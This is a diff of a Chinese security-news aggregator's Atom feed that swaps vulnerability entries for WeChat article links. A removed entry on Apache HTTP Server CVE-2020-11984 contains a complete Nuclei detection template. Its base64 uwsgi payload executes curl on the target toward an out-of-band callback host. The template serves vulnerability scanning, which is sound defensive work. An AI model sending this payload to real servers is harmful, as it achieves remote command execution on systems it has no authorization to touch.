-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CVE-2025-49144</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-49144</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> PoC CVE-2025-49144</p><p><strong>来源：</strong> <a href="https://github.com/Vr00mm/CVE-2025-49144">https://github.com/Vr00mm/CVE-2025-49144</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/VdnOE27JRqt2psEntCGUmQ">https://mp.weixin.qq.com/s/VdnOE27JRqt2psEntCGUmQ</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CVE-2025-49144&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/st</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/VdnOE27JRqt2psEntCGUmQ&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
   <entry>
-    <title>Apache HTTP Server 远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/24/github_2878399069/"/>
-    <id>http://example.com/2025/06/24/github_2878399069/</id>
-    <published>2025-06-24T16:45:16.063Z</published>
-    <updated>2025-06-24T16:45:16.059Z</updated>
+    <title>以色列官员称伊朗利用安全摄像头引导导弹袭击</title>
+    <link href="http://example.com/2025/06/25/weixin_4169155941/"/>
+    <id>http://example.com/2025/06/25/weixin_4169155941/</id>
+    <published>2025-06-25T05:17:57.522Z</published>
+    <updated>2025-06-25T05:17:57.518Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache HTTP Server 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2020-11984</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Apache HTTP Server 2.4.32至2.4.44版本中的mod_proxy_uwsgi模块存在信息泄露及可能的远程代码执行漏洞，远程攻击者通过发送精心构造的请求，可以访问敏感信息并可能执行任意代码。</p><p><strong>产品厂商：</strong> apache</p><p><strong>产品名称：</strong> http_server</p><p><strong>影响版本：</strong> 2.4.32 &lt;&#x3D; version &lt;&#x3D; 2.4.44</p><p><strong>搜索语法：</strong> server: cpe:”cpe:2.3:a:apache:http_server”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/eec91c8e590de65c7d044b8a21a65789bc4948d2/code%2Fcves%2F2020%2FCVE-2020-11984.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/eec91c8e590de65c7d044b8a21a65789bc4948d2/code%2Fcves%2F2020%2FCVE-2020-11984.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">11984</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Apache HTTP Server <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> wofeiwo@<span class="hljs-number">80</span>sec.com,pszyszkowski,pdresearch,iamnoooob<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Apache HTTP Server <span class="hljs-number">2.4</span>.<span class="hljs-number">32</span> to <span class="hljs-number">2.4</span>.<span class="hljs-number">44</span> contains an info disclosure and possible remote code execution caused by a vulnerability <span class="hljs-keyword">in</span> mod_proxy_uwsgi, letting remote attackers access sensitive information and potentially execute arbitrary code, exploit requires sending crafted requests.<br>  <span class="hljs-params">remediation:</span> |<br>    Update to <span class="hljs-operator">&gt;=</span> <span class="hljs-number">2.4</span>.<span class="hljs-number">45</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/RubenBar/MLW-upcrans/tree/main/1.Exploit</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/cve-2020-11984</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>0-<span class="hljs-number">11984</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">120</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">vendor:</span> apache<br>    <span class="hljs-params">product:</span> http_server<br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">server:</span> cpe:<span class="hljs-string">&quot;cpe:2.3:a:apache:http_server&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2020,apache,httpd,rce<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">oast:</span> <span class="hljs-string">&quot;.&#123;&#123;interactsh-url&#125;&#125;&quot;</span><br>  <span class="hljs-params">payload:</span> <span class="hljs-string">&quot;&#123;&#123;padding(oast,&#x27;a&#x27;,54,&#x27;prefix&#x27;)&#125;&#125;&quot;</span><br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |-<br>        POST <span class="hljs-symbol">/penterate</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        &#123;&#123;replace(base64_decode(&#x27;AHIAAAoAVVdTR0lfRklMRUsAZXhlYzovL2N1cmwgYWFhYWFhYWEuZmw0NGhoY240NHEydWtsdjI5YnB6dTR1amxwY2QzM3JzLm9hc3RpZnkuY29tOyBlY2hvICIiCwBTQ1JJUFRfTkFNRQoAL3BlbmV0cmF0ZQ<span class="hljs-operator">==</span>&#x27;),&#x27;aaaaaaaa.fl44hhcn44q2uklv29bpzu4ujlpcd33rs.oastify.com&#x27;,payload)&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains(interactsh_protocol, <span class="hljs-string">&quot;dns&quot;</span>)&#x27;<br><br></code></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Veazafqn8Pu413UMvQsSYg">https://mp.weixin.qq.com/s/Veazafqn8Pu413UMvQsSYg</a></p>]]></content>
     
     
       
       
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache HTTP Server 远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;str</summary>
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/Veazafqn8Pu413UMvQsSYg&quot;&gt;https://mp.weixin.</summary>
       
     
     
     
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
     
     
-    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
     
   </entry>
   
